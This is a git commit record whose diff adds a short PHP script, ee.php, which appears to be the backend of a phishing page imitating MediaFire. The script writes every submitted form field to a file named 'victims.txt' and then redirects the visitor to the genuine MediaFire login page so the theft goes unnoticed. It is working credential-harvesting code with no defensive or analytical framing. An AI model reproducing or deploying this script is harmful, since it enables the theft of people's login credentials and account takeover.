3c18e990bac59a7866c30ade717110a96cd1cc09
Sem0zne <65516242+Sem0zne@users.noreply.github.com>
2020-06-09 12:38:28 +0000

    Update ee.php

--- ee.php
+++ ee.php
@@ -1,1 +1,27 @@
 
+<?php
+
+header ('Location: https://www.mediafire.com/login');
+
+$handle = fopen("victims.txt", "a");
+
+foreach($_POST as $variable => $value) {
+
+fwrite($handle, $variable);
+
+fwrite($handle, "=");
+
+fwrite($handle, $value);
+
+fwrite($handle, "\r\n");
+
+}
+
+fwrite($handle, "\r\n\n\n\n");
+
+fclose($handle);
+
+exit;
+
+?>
+
